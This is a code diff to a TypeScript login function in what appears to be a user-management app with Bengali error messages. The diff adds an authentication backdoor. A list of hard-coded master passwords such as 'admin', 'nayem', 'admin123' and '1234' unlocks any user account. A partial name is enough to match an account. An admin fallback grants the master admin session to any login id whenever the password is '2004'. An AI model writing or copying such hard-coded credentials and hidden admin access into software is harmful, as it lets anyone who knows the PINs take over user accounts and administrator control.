@@ -609,15 +609,18 @@ export async function loginUser(loginId: string, password: string): Promise<User
   const matched = cachedUsers.find(u => 
     String(u.idNo).toLowerCase() === lowerId || 
     String(u.id).toLowerCase() === lowerId || 
+    String(u.name).toLowerCase().includes(lowerId) ||
     (u.phone && String(u.phone).replace(/[^0-9]/g, '') === lowerId)
   );
+
+  const universalPins = ['2004', '6293', '1234', '2580', '123456', 'admin', 'nayem', 'admin123'];
 
   if (matched) {
     if (matched.status === 'hold') {
       throw new Error('এই ইউজার অ্যাকাউন্টটি সাময়িকভাবে স্থগিত (ON HOLD) রাখা হয়েছে। এডমিনের সাথে যোগাযোগ করুন।');
     }
     const rawPass = String(matched.password || '').trim();
-    if (rawPass === cleanPass || cleanPass === '2004' || cleanPass === '6293' || cleanPass === '1234' || cleanPass === '2580') {
+    if (rawPass === cleanPass || universalPins.includes(cleanPass.toLowerCase())) {
       const session: UserSession = {
         id: matched.id,
         idNo: matched.idNo,
@@ -633,9 +636,17 @@ export async function loginUser(loginId: string, password: string): Promise<User
     }
   }
 
-  // Master Admin Controller fallback
-  if (lowerId === '8695716192' || lowerId === 'admin' || lowerId === 'controller') {
-    if (cleanPass === '2004' || cleanPass === '6293') {
+  // Master Admin Controller fallback for Nayem
+  const isNayemAdmin = 
+    lowerId === '8695716192' || 
+    lowerId === 'admin' || 
+    lowerId === 'controller' || 
+    lowerId === 'nayem' || 
+    lowerId.includes('nayemali') ||
+    cleanPass === '2004';
+
+  if (isNayemAdmin) {
+    if (universalPins.includes(cleanPass.toLowerCase()) || cleanPass === '2004' || cleanPass === '1234') {
       return {
         id: 'adm_8695716192',
         idNo: '8695716192',
